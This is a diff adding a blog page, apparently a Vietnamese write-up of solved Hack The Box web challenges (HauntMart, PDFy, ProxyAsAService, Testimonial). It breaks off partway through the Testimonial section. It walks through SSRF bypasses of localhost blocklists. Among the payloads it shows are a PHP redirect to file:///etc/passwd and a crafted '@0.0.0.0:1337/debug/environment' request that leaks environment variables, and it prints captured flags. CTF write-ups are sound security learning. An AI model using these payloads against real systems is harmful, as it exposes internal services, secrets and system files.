@@ -1,0 +1,2482 @@
+
+
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>Htb web chall ctf 2024 - solved challenges - part 2 - Zoltán&#39;s Blog</title>
+  <meta name="description" content="Hack the box HauntMart  Tiếp tục chall với cấu trúc y hệt như mấy chall python_flask trước:  from flask import Flaskfrom application.blueprints.routes import web, apifrom application.database import mysqlfrom application.util import responseapp = Flask(__name__)app.config.from_object(&#39;application.config.Config&#39;)mysql.init_app(app)app.register_blueprint(web, url_prefix=&#39;/&#39;)app.register_blueprint(api, url_prefix=&#39;/api&#39;)@app.errorhandler(404)def not_found(error):return response(&#39;404 Not Found&#39;), 404@app.errorhandler(403)def forbidden(error):return response(&#39;403 Forbidden&#39;), 403@app.errorhandler(400)def bad_request(error):return response(&#39;400 Bad Request&#39;), 400@app.errorhandler(Exception)def handle_error(error):message = error.">
+  <meta name="author" content="Zoltán Balogh"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Zoltán\u0027s Blog",
+    
+    "url": "https:\/\/bzoltan1.github.io\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/bzoltan1.github.io\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/write-up\/2024-08-21-hackthebox-web-challpart2\/",
+          "name": "Htb web chall ctf 2024 solved challenges part 2"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : ""
+  },
+  "headline": "Htb web chall ctf 2024 - solved challenges - part 2",
+  "description" : "Hack the box HauntMart  Tiếp tục chall với cấu trúc y hệt như mấy chall python_flask trước:  from flask import Flask\rfrom application.blueprints.routes import web, api\rfrom application.database import mysql\rfrom application.util import response\rapp = Flask(__name__)\rapp.config.from_object(\u0027application.config.Config\u0027)\rmysql.init_app(app)\rapp.register_blueprint(web, url_prefix=\u0027\/\u0027)\rapp.register_blueprint(api, url_prefix=\u0027\/api\u0027)\r@app.errorhandler(404)\rdef not_found(error):\rreturn response(\u0027404 Not Found\u0027), 404\r@app.errorhandler(403)\rdef forbidden(error):\rreturn response(\u0027403 Forbidden\u0027), 403\r@app.errorhandler(400)\rdef bad_request(error):\rreturn response(\u0027400 Bad Request\u0027), 400\r@app.errorhandler(Exception)\rdef handle_error(error):\rmessage = error.",
+  "inLanguage" : "en",
+  "wordCount":  7116 ,
+  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
+  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
+  "image" : "https:\/\/bzoltan1.github.io\/avatar.png",
+  "keywords" : [ "CTF, Vietnamese" ],
+  "mainEntityOfPage" : "https:\/\/bzoltan1.github.io\/write-up\/2024-08-21-hackthebox-web-challpart2\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/bzoltan1.github.io\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/bzoltan1.github.io\/avatar.png",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+
+<meta property="og:title" content="Htb web chall ctf 2024 - solved challenges - part 2" />
+<meta property="og:description" content="Hack the box HauntMart  Tiếp tục chall với cấu trúc y hệt như mấy chall python_flask trước:  from flask import Flaskfrom application.blueprints.routes import web, apifrom application.database import mysqlfrom application.util import responseapp = Flask(__name__)app.config.from_object(&#39;application.config.Config&#39;)mysql.init_app(app)app.register_blueprint(web, url_prefix=&#39;/&#39;)app.register_blueprint(api, url_prefix=&#39;/api&#39;)@app.errorhandler(404)def not_found(error):return response(&#39;404 Not Found&#39;), 404@app.errorhandler(403)def forbidden(error):return response(&#39;403 Forbidden&#39;), 403@app.errorhandler(400)def bad_request(error):return response(&#39;400 Bad Request&#39;), 400@app.errorhandler(Exception)def handle_error(error):message = error.">
+<meta property="og:image" content="https://bzoltan1.github.io/avatar.png" />
+<meta property="og:url" content="https://bzoltan1.github.io/write-up/2024-08-21-hackthebox-web-challpart2/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Zoltán&#39;s Blog" />
+
+  <meta name="twitter:title" content="Htb web chall ctf 2024 - solved challenges - part 2" />
+  <meta name="twitter:description" content="Hack the box HauntMart  Tiếp tục chall với cấu trúc y hệt như mấy chall python_flask trước:  from flask import Flaskfrom application.blueprints.routes import web, apifrom application.database import …">
+  <meta name="twitter:image" content="https://bzoltan1.github.io/avatar.png" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <link href='https://bzoltan1.github.io/avatar.png' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.83.1" />
+  <link rel="alternate" href="https://bzoltan1.github.io/index.xml" type="application/rss+xml" title="Zoltán&#39;s Blog"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://bzoltan1.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/syntax.css" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Blog" href="https://bzoltan1.github.io/">Blog</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Tags" href="https://bzoltan1.github.io/tags">Tags</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Home" href="https://bzoltan1.github.io/">Home</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="About" href="https://bzoltan1.github.io/about">About</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="Zoltán&#39;s Blog" href="https://bzoltan1.github.io/">
+            <img class="avatar-img" src="https://bzoltan1.github.io/avatar.png" alt="Zoltán&#39;s Blog" />
+           
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="write-up-heading">
+              
+                <h1>Htb web chall ctf 2024 - solved challenges - part 2</h1>
+              
+              
+                <hr class="small">
+              
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <!-- raw HTML omitted -->
+<h1 id="hack-the-box">Hack the box</h1>
+<h2 id="hauntmart">HauntMart</h2>
+<ul>
+<li>Tiếp tục chall với cấu trúc y hệt như mấy chall python_flask trước:</li>
+</ul>
+<pre><code>from flask import Flask
+from application.blueprints.routes import web, api
+from application.database import mysql
+from application.util import response
+
+app = Flask(__name__)
+app.config.from_object('application.config.Config')
+
+mysql.init_app(app)
+
+app.register_blueprint(web, url_prefix='/')
+app.register_blueprint(api, url_prefix='/api')
+
+@app.errorhandler(404)
+def not_found(error):
+    return response('404 Not Found'), 404
+
+@app.errorhandler(403)
+def forbidden(error):
+    return response('403 Forbidden'), 403
+
+@app.errorhandler(400)
+def bad_request(error):
+    return response('400 Bad Request'), 400
+
+@app.errorhandler(Exception)
+def handle_error(error):
+    message = error.description if hasattr(error, 'description') else [str(x) for x in error.args]
+    response = {
+        'error': {
+            'type': error.__class__.__name__,
+            'message': message
+        }
+    }
+
+    return response, error.code if hasattr(error, 'code') else 500
+</code></pre><ul>
+<li>Quan sát luôn các route nhé:</li>
+</ul>
+<pre><code>from application.database import *
+from flask import Blueprint, redirect, render_template, request, session, current_app
+from application.util import response, isAuthenticated, generateToken, isFromLocalhost, downloadManual
+import sys
+
+web = Blueprint('web', __name__)
+api = Blueprint('api', __name__)
+
+@web.route('/', methods=['GET'])
+def loginView():
+    return render_template('login.html')
+
+@web.route('/register', methods=['GET'])
+def registerView():
+    return render_template('register.html')
+
+@web.route('/home', methods=['GET'])
+@isAuthenticated
+def homeView(user):
+    return render_template('index.html', user=user, flag=current_app.config['FLAG'])
+
+@web.route('/product', methods=['GET'])
+@isAuthenticated
+def productView(user):
+    return render_template('product.html', user=user)
+
+@web.route('/logout')
+def logout():
+    session['token'] = None
+    return redirect('/')
+
+@api.route('/login', methods=['POST'])
+def api_login():
+    if not request.is_json:
+        return response('Invalid JSON!'), 400
+    
+    data = request.get_json()
+    username = data.get('username', '')
+    password = data.get('password', '')
+    
+    if not username or not password:
+        return response('All fields are required!'), 401
+    
+    user = loginUserDb(username, password)
+    
+    if user:
+        token = generateToken(user.get('username'), user.get('role'))
+        session['token'] = token
+        return response('Success'), 200
+        
+    return response('Invalid credentials!'), 403
+
+@api.route('/register', methods=['POST'])
+def api_register():
+    if not request.is_json:
+        return response('Invalid JSON!'), 400
+    
+    data = request.get_json()
+    username = data.get('username', '')
+    password = data.get('password', '')
+    
+    if not username or not password:
+        return response('All fields are required!'), 401
+    
+    user = registerUserDb(username, password, 'user')
+    
+    if user:
+        return response('User registered! Please login'), 200
+        
+    return response('User already exists!'), 403
+
+@api.route('/product', methods=['POST'])
+@isAuthenticated
+def sellProduct(user):
+    if not request.is_json:
+        return response('Invalid JSON!'), 400
+
+    data = request.get_json()
+    name = data.get('name', '')
+    price = data.get('price', '')
+    description = data.get('description', '')
+    manualUrl = data.get('manual', '')
+
+    if not name or not price or not description or not manualUrl:
+        return response('All fields are required!'), 401
+
+    manualPath = downloadManual(manualUrl)
+    if (manualPath):
+        addProduct(name, description, price)
+        return response('Product submitted! Our mods will review your request')
+    return response('Invalid Manual URL!'), 400
+
+
+@api.route('/addAdmin', methods=['GET'])
+@isFromLocalhost
+def addAdmin():
+    username = request.args.get('username')
+    
+    if not username:
+        return response('Invalid username'), 400
+    
+    result = makeUserAdmin(username)
+
+    if result:
+        return response('User updated!')
+    return response('Invalid username'), 400
+</code></pre><ul>
+<li>Vị trí của flag nằm ở <code>/flag.txt</code>.</li>
+<li>Ta có thể thấy trong route.py -&gt; route /home:</li>
+</ul>
+<pre><code>@web.route('/home', methods=['GET'])
+@isAuthenticated
+def homeView(user):
+    return render_template('index.html', user=user, flag=current_app.config['FLAG'])
+</code></pre><ul>
+<li>Nếu role của người dùng là admin thì sẽ hiển thị flag cho chúng ta:</li>
+</ul>
+<pre><code>{% if user['role'] == 'admin' %}
+ {{flag}}
+{% endif %}
+</code></pre><ul>
+<li>giờ thì tìm nơi liên quan đến nó -&gt; có thể thấy ở đây có một api đển addAdmin nhưng mà nó phải là localhost mới được truy cập:</li>
+</ul>
+<pre><code>@api.route('/addAdmin', methods=['GET'])
+@isFromLocalhost
+def addAdmin():
+    username = request.args.get('username')
+    
+    if not username:
+        return response('Invalid username'), 400
+    
+    result = makeUserAdmin(username)
+
+    if result:
+        return response('User updated!')
+    return response('Invalid username'), 400
+</code></pre><pre><code>def isFromLocalhost(func):
+    @wraps(func)
+    def check_ip(*args, **kwargs):
+        if request.remote_addr != &quot;127.0.0.1&quot;:
+            return abort(403)
+        return func(*args, **kwargs)
+
+    return check_ip
+</code></pre><ul>
+<li>Trông có vẻ như chưa có bypass được ở đây -&gt; quan sát các route còn lại ngoài chức năng đăng nhập và đăng kí thì chỉ còn 1 api này:</li>
+</ul>
+<pre><code>@api.route('/product', methods=['POST'])
+@isAuthenticated
+def sellProduct(user):
+    if not request.is_json:
+        return response('Invalid JSON!'), 400
+
+    data = request.get_json()
+    name = data.get('name', '')
+    price = data.get('price', '')
+    description = data.get('description', '')
+    manualUrl = data.get('manual', '')
+
+    if not name or not price or not description or not manualUrl:
+        return response('All fields are required!'), 401
+
+    manualPath = downloadManual(manualUrl)
+    if (manualPath):
+        addProduct(name, description, price)
+        return response('Product submitted! Our mods will review your request')
+    return response('Invalid Manual URL!'), 400
+
+</code></pre><ul>
+<li>Chỉ cần authen người dùng bình thường lấy name, price, description, manual sau đó gọi hàm <code>downloadManual</code> với url được truyền vào -&gt; nếu có thì addProduct và trả về.</li>
+</ul>
+<pre><code>def downloadManual(url):
+    safeUrl = isSafeUrl(url)
+    if safeUrl:
+        try:
+            local_filename = url.split(&quot;/&quot;)[-1]
+            r = requests.get(url)
+            
+            with open(f&quot;/opt/manualFiles/{local_filename}&quot;, &quot;wb&quot;) as f:
+                for chunk in r.iter_content(chunk_size=1024):
+                    if chunk:
+                        f.write(chunk)
+            return True
+        except:
+            return False
+    
+    return False
+</code></pre><ul>
+<li>Hàm này sẽ thực hiện check url với hàm:</li>
+</ul>
+<pre><code>blocked_host = [&quot;127.0.0.1&quot;, &quot;localhost&quot;, &quot;0.0.0.0&quot;]
+def isSafeUrl(url):
+    for hosts in blocked_host:
+        if hosts in url:
+            return False
+    
+    return True
+
+</code></pre><ul>
+<li>ip của ta phải khác với các ip trong mảng thì vượt qua -&gt; sau đó nó <code>r = requests.get(url)</code></li>
+<li>Không cần để ý phần sau nữa vì ta sẽ lợi dụng cái này để truyền url gọi đến addAdmin để cấp quyền admin cho user mà mình đăng nhập.</li>
+</ul>
+<h3 id="exploit">exploit</h3>
+<p><img src="https://hackmd.io/_uploads/ByvRMsqI0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/rywlVscI0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/H1ErKs58A.png" alt="image"></p>
+<p>flag : <code>HTB{s5rf_m4d3_m3_w3t_my_p4nts!}</code></p>
+<h2 id="pdfy">PDFy</h2>
+<p><img src="https://hackmd.io/_uploads/rkNTmn980.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/B1H57n5LA.png" alt="image">
+<img src="https://hackmd.io/_uploads/BJFj73qIR.png" alt="image"></p>
+<pre><code>┌──(l3mnt2010㉿ASUSEXPERTBOOK)-[~/PDFy]
+└─$ cat index.php
+&lt;?php header('location:file:///etc/passwd'); ?&gt;
+</code></pre><p>flag : <code>HTB{pdF_g3n3r4t1on_g03s_brrr!}</code></p>
+<h2 id="proxyasaservice">ProxyAsAService</h2>
+<ul>
+<li>Một chall với flask_python với các route sau:</li>
+</ul>
+<pre><code>from flask import Flask, jsonify
+from application.blueprints.routes import proxy_api, debug
+
+app = Flask(__name__)
+app.config.from_object('application.config.Config')
+
+app.register_blueprint(proxy_api, url_prefix='/')
+app.register_blueprint(debug, url_prefix='/debug')
+
+@app.errorhandler(404)
+def not_found(error):
+    return jsonify({'error': 'Not Found'}), 404
+
+@app.errorhandler(403)
+def forbidden(error):
+    return jsonify({'error': 'Not Allowed'}), 403
+
+@app.errorhandler(400)
+def bad_request(error):
+    return jsonify({'error': 'Bad Request'}), 400
+</code></pre><ul>
+<li>Route / và /debug:</li>
+</ul>
+<pre><code>from flask import Blueprint, request, Response, jsonify, redirect, url_for
+from application.util import is_from_localhost, proxy_req
+import random, os
+
+SITE_NAME = 'reddit.com'
+
+proxy_api = Blueprint('proxy_api', __name__)
+debug     = Blueprint('debug', __name__)
+
+
+@proxy_api.route('/', methods=['GET', 'POST'])
+def proxy():
+    url = request.args.get('url')
+
+    if not url:
+        cat_meme_subreddits = [
+            '/r/cats/',
+            '/r/catpictures',
+            '/r/catvideos/'
+        ]
+
+        random_subreddit = random.choice(cat_meme_subreddits)
+
+        return redirect(url_for('.proxy', url=random_subreddit))
+    
+    target_url = f'http://{SITE_NAME}{url}'
+    response, headers = proxy_req(target_url)
+
+    return Response(response.content, response.status_code, headers.items())
+
+@debug.route('/environment', methods=['GET'])
+@is_from_localhost
+def debug_environment():
+    environment_info = {
+        'Environment variables': dict(os.environ),
+        'Request headers': dict(request.headers)
+    }
+
+    return jsonify(environment_info)
+
+</code></pre><ul>
+<li>
+<p>Như ta thấy ở đây có 2 route <code>/proxy_api/</code> và <code>/debug/environment</code></p>
+</li>
+<li>
+<p>Như thường lệ ta sẽ check xem vị trí của flag:</p>
+</li>
+</ul>
+<pre><code>/Dockerfile
+
+FROM python:3-alpine
+
+# Install packages
+RUN apk add --update --no-cache libcurl curl-dev build-base supervisor
+
+
+# Upgrade pip
+RUN python -m pip install --upgrade pip
+
+# Install dependencies
+RUN pip install Flask requests
+
+# Setup app
+RUN mkdir -p /app
+
+# Switch working environment
+WORKDIR /app
+
+# Add application
+COPY challenge .
+
+# Setup supervisor
+COPY config/supervisord.conf /etc/supervisord.conf
+
+# Expose port the server is reachable on
+EXPOSE 1337
+
+# Disable pycache
+ENV PYTHONDONTWRITEBYTECODE=1
+
+# Place flag in environ
+ENV FLAG=HTB{f4k3_fl4g_f0r_t3st1ng}
+
+# Run supervisord
+CMD [&quot;/usr/bin/supervisord&quot;, &quot;-c&quot;, &quot;/etc/supervisord.conf&quot;]
+
+</code></pre><ul>
+<li>
+<p>ở đây ta có thể thấy vị trí của flag nằm ở trong env -&gt; vậy 1 là rce hoặc 2 là cách nào để đọc file env không.</p>
+</li>
+<li>
+<p>Và thấy ở đây là route /debug/enviroment trả ra nội dung <code> environment_info = { 'Environment variables': dict(os.environ), 'Request headers': dict(request.headers) }</code></p>
+</li>
+<li>
+<p>Nhưng sẽ có một middlware check localhost:</p>
+</li>
+</ul>
+<pre><code>def is_from_localhost(func):
+    @functools.wraps(func)
+    def check_ip(*args, **kwargs):
+        if request.remote_addr != '127.0.0.1':
+            return abort(403)
+        return func(*args, **kwargs)
+    return check_ip
+
+</code></pre><ul>
+<li>Check_ip nó là 127.0.0.1 thì cho acccess.</li>
+<li>Vậy thì nơi để access nó chắc hẳn là route còn lại:</li>
+</ul>
+<pre><code>
+@proxy_api.route('/', methods=['GET', 'POST'])
+def proxy():
+    url = request.args.get('url')
+
+    if not url:
+        cat_meme_subreddits = [
+            '/r/cats/',
+            '/r/catpictures',
+            '/r/catvideos/'
+        ]
+
+        random_subreddit = random.choice(cat_meme_subreddits)
+
+        return redirect(url_for('.proxy', url=random_subreddit))
+    
+    target_url = f'http://{SITE_NAME}{url}'
+    response, headers = proxy_req(target_url)
+
+    return Response(response.content, response.status_code, headers.items())
+</code></pre><ul>
+<li>
+<p>Nó nhận get vả post với param url -&gt; thiết lập <code>target_url = f'http://{SITE_NAME}{url}'</code> mặc định là host của reddit -&gt; sau đó gửi request đến.</p>
+</li>
+<li>
+<p>Vậy làm sao để nó gọi đến /debug/environment -&gt; chỉ cần nó gọi đến endpoint này là sẽ access được FLAG và hiển thị.</p>
+</li>
+<li>
+<p>Quan sát 1 chút về uri :</p>
+</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/BkhuQ7hUC.png" alt="image"></p>
+<ul>
+<li>
+<p>có thể thấy phần host sẽ luân đứng như hình và sau dấu @ vậy nếu ta thêm @ vào trước url param và sau đó là localhost thì lúc này nó nhận phần trước là user và info -&gt; bypass được localhost.</p>
+</li>
+<li>
+<p>Chú ý black-list:</p>
+</li>
+</ul>
+<pre><code>
+RESTRICTED_URLS = ['localhost', '127.', '192.168.', '10.', '172.']
+def proxy_req(url):    
+    method = request.method
+    headers =  {
+        key: value for key, value in request.headers if key.lower() in ['x-csrf-token', 'cookie', 'referer']
+    }
+    data = request.get_data()
+
+    response = requests.request(
+        method,
+        url,
+        headers=headers,
+        data=data,
+        verify=False
+    )
+
+    if not is_safe_url(url) or not is_safe_url(response.url):
+        return abort(403)
+    
+    return response, headers
+</code></pre><h3 id="exploit-1">Exploit</h3>
+<p><img src="https://hackmd.io/_uploads/Bk9MBX28C.png" alt="image"></p>
+<pre><code>GET /?url=@0.0.0.0:1337/debug/environment HTTP/1.1
+Host: 94.237.49.212:30902
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Upgrade-Insecure-Requests: 1
+Priority: u=1
+
+
+</code></pre><p>flag: <code>HTB{fl4gs_4s_4_S3rv1c3}</code></p>
+<h2 id="testimonial">Testimonial</h2>
+<ul>
+<li>Một chall với golang chạy grpc để làm waf:</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/S1DrbhiLR.png" alt="image"></p>
+<ul>
+<li>Ta có thế thấy flow chính của trang nằm ở main.go:</li>
+</ul>
+<pre><code>
+package main
+
+import (
+	&quot;embed&quot;
+	&quot;htbchal/handler&quot;
+	&quot;htbchal/pb&quot;
+	&quot;log&quot;
+	&quot;net&quot;
+	&quot;net/http&quot;
+
+	&quot;github.com/go-chi/chi/v5&quot;
+	&quot;google.golang.org/grpc&quot;
+)
+
+//go:embed public
+var FS embed.FS
+
+func main() {
+	router := chi.NewMux()
+
+	router.Handle(&quot;/*&quot;, http.StripPrefix(&quot;/&quot;, http.FileServer(http.FS(FS))))
+	router.Get(&quot;/&quot;, handler.MakeHandler(handler.HandleHomeIndex))
+	go startGRPC()
+	log.Fatal(http.ListenAndServe(&quot;:1337&quot;, router))
+}
+
+type server struct {
+	pb.RickyServiceServer
+}
+
+func startGRPC() error {
+	lis, err := net.Listen(&quot;tcp&quot;, &quot;:50045&quot;)
+	if err != nil {
+		log.Fatal(err)
+	}
+	s := grpc.NewServer()
+
+	pb.RegisterRickyServiceServer(s, &amp;server{})
+	if err := s.Serve(lis); err != nil {
+		log.Fatal(err)
+	}
+	return nil
+}
+
+</code></pre><ul>
+<li>
+<p>ở đây chúng ta có thể thấy có một route chúng đó là <code>router.Get(&quot;/&quot;, handler.MakeHandler(handler.HandleHomeIndex))</code> và để ý thêm là server đang chạy ở cổng 1337 và start thêm một cổng 50045 với giao thức tcp để lắng nghe các sự kiện.</p>
+</li>
+<li>
+<p>Dưới đây là phần logic của HandlerHomeIndex:</p>
+</li>
+</ul>
+<pre><code>func HandleHomeIndex(w http.ResponseWriter, r *http.Request) error {
+	customer := r.URL.Query().Get(&quot;customer&quot;)
+	testimonial := r.URL.Query().Get(&quot;testimonial&quot;)
+	if customer != &quot;&quot; &amp;&amp; testimonial != &quot;&quot; {
+		c, err := client.GetClient()
+		if err != nil {
+			http.Error(w, err.Error(), http.StatusInternalServerError)
+
+		}
+
+		if err := c.SendTestimonial(customer, testimonial); err != nil {
+			http.Error(w, err.Error(), http.StatusInternalServerError)
+
+		}
+	}
+	return home.Index().Render(r.Context(), w)
+}
+
+</code></pre><ul>
+<li>Nhận 2 query đó là <code>customer</code> và <code>testimonial</code> nếu mà 1 trong 2 giá trị không tồn tại thì trả tra error.</li>
+<li>Sau đó khởi tạo connect đến localhost port tcp <code>c, err := client.GetClient()</code>:</li>
+</ul>
+<pre><code>func GetClient() (*Client, error) {
+	mutex.Lock()
+	defer mutex.Unlock()
+
+	if grpcClient == nil {
+		conn, err := grpc.Dial(fmt.Sprintf(&quot;127.0.0.1%s&quot;, &quot;:50045&quot;), grpc.WithInsecure())
+		if err != nil {
+			return nil, err
+		}
+
+		grpcClient = &amp;Client{pb.NewRickyServiceClient(conn)}
+	}
+
+	return grpcClient, nil
+}
+</code></pre><ul>
+<li>Tiếp tục gửi 2 query đến tcp server <code>c.SendTestimonial(customer, testimonial)</code>:</li>
+</ul>
+<pre><code>func (c *Client) SendTestimonial(customer, testimonial string) error {
+	ctx := context.Background()
+	// Filter bad characters.
+	for _, char := range []string{&quot;/&quot;, &quot;\\&quot;, &quot;:&quot;, &quot;*&quot;, &quot;?&quot;, &quot;\&quot;&quot;, &quot;&lt;&quot;, &quot;&gt;&quot;, &quot;|&quot;, &quot;.&quot;} {
+		customer = strings.ReplaceAll(customer, char, &quot;&quot;)
+	}
+
+	_, err := c.SubmitTestimonial(ctx, &amp;pb.TestimonialSubmission{Customer: customer, Testimonial: testimonial})
+	return err
+}
+</code></pre><ul>
+<li>
+<p>ở đây nó sẽ lặp qua mảng các string như trên để filter các lỗi xss hoặc ssti và các lỗi có nguy cơ xảy ra trong cú pháp của golang -&gt; replace toàn bộ những kí tự gặp phải -&gt; gọi phương thức <code>c.SubmitTestimonial(ctx, &amp;pb.TestimonialSubmission{Customer: customer, Testimonial: testimonial})</code> để gửi chúng.</p>
+</li>
+<li>
+<p>Cuối cùng sẽ hiển thị <code>return home.Index().Render(r.Context(), w)</code> chính là template <code>index.templ</code> để hiển thị các bản note đã ghi:</p>
+</li>
+</ul>
+<pre><code>
+package home
+
+import (
+	&quot;htbchal/view/layout&quot;
+	&quot;io/fs&quot;	
+	&quot;fmt&quot;
+	&quot;os&quot;
+)
+
+templ Index() {
+	@layout.App(true) {
+&lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-black&quot;&gt;
+  &lt;div class=&quot;container-fluid&quot;&gt;
+    &lt;a class=&quot;navbar-brand&quot; href=&quot;/&quot;&gt;The Fray&lt;/a&gt;
+    &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarNav&quot;
+            aria-controls=&quot;navbarNav&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+        &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+    &lt;/button&gt;
+    &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNav&quot;&gt;
+        &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;
+            &lt;li class=&quot;nav-item active&quot;&gt;
+                &lt;a class=&quot;nav-link&quot; href=&quot;/&quot;&gt;Home&lt;/a&gt;
+            &lt;/li&gt;
+            &lt;li class=&quot;nav-item&quot;&gt;
+                &lt;a class=&quot;nav-link&quot; href=&quot;javascript:void();&quot;&gt;Factions&lt;/a&gt;
+            &lt;/li&gt;
+            &lt;li class=&quot;nav-item&quot;&gt;
+                &lt;a class=&quot;nav-link&quot; href=&quot;javascript:void();&quot;&gt;Trials&lt;/a&gt;
+            &lt;/li&gt;
